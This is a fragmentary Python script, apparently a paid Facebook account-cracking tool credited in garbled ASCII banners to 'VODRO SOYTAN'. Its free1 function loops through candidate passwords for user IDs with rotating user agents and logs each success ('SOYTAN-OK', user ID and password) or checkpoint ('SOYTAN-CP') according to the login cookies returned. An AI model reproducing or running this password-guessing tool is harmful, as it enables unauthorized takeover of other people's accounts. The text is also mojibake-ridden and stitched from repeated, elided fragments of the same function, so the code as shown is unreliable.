...
â•‘ Creator  : VODRO SOYTAN                      â•‘
â•‘ Github   : https://github.com/Soytan09  â•‘
â•‘ Facebook : VODRO SOYTAN                           â•‘
...
â•‘ Creator  : VODRO SOYTAN                                â•‘
â•‘ Github   : https://github.com/Soytan09 â•‘
â•‘ Facebook : VODRO SOYTAN ðŸ™‚â¤ï¸                â•‘
â•‘ Brothers :            SOYTAN                        â•‘
â•‘ NOTE     :   Paid ToolðŸ˜“                                    â•‘
...
def free1(uid,pwx,tl):
    ...
    'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',
            ...
            if 'c_user' in log_cookies:
                ...
                uid = coki[7:22]
                print('\r\033[1;32m[SOYTAN-OK] '+uid+' [âˆš] '+ps+ '')
                ...
                if 'Enter login code to continue' in log_cookies:
                    ...
                    uid=coki[24:39]
                    Red = '\033[1;31m'
                    print(f'\r\033[1;35m[SOYTAN-CP] '+uid+' [Ã—] '+ps+ ' ')
...
def free1(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            bi = random.choice([A])
            session = requests.Session()
            sys.stdout.write(f'\r\33[1;37m[SOYTAN ðŸ”¥] [%s] \33[1;97m[OK:%s{SRABON}CP:%s]'%(loop,len(ok),len(cp))), 
            sys.stdout.flush()
            pro = random.choice(ugen)
...
def free1(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            bi = random.choice([A])
            session = requests.Session()
            sys.stdout.write(f'\r\33[1;37m[SOYTAN ðŸ”¥] [%s] \33[1;97m[OK:%s{SOYTAN2}CP:%s]'%(loop,len(ok),len(cp))), 
            sys.stdout.flush()
            pro = random.choice(ugen)
